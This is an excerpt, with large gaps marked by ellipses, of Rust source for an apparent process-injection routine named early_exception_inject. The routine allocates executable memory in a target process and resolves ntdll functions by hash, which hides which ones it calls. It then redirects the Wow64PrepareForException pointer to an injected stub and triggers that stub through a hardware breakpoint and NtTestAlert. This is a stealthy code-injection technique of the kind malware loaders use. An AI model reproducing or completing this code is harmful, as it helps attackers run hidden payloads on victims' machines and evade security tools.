...
pub unsafe fn exec(
    ...
    let wow64_prepare_for_exception = wow64::return_wow64_function_pointer(ntdll as *mut u8)
        .ok_or("Failed to find Wow64PrepareForException")?;
    ...
    #[cfg(feature = "debug")]
    {
        crate::utils::print_message(&format!(
            "[DEBUG] early_exception_inject target_program raw: '{}'",
            target_program
        ));
        match normalize_nt_path(target_program.as_str()) {
            Ok(p) => crate::utils::print_message(&format!(
                "[DEBUG] early_exception_inject normalized nt path: '{}'",
                p
            )),
            Err(e) => {
                crate::utils::print_message(&format!("[DEBUG] normalize_nt_path failed: {}", e))
            }
        }
    }
    ...
    let stub_addr =
        alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;
    let nt_protect_addr =
        get_export_by_hash(ntdll, NT_PROTECT_HASH).ok_or("NtProtectVirtualMemory not found")?;
    ...
    write_virtual_memory(
        process_info.hProcess,
        wow64_prepare_for_exception as usize,
        &stub_addr_bytes,
    )?;

    // Trigger exception via HWBP
    let nt_test_alert_addr =
        get_export_by_hash(ntdll, NT_TEST_ALERT_HASH).ok_or("NtTestAlert not found")?;
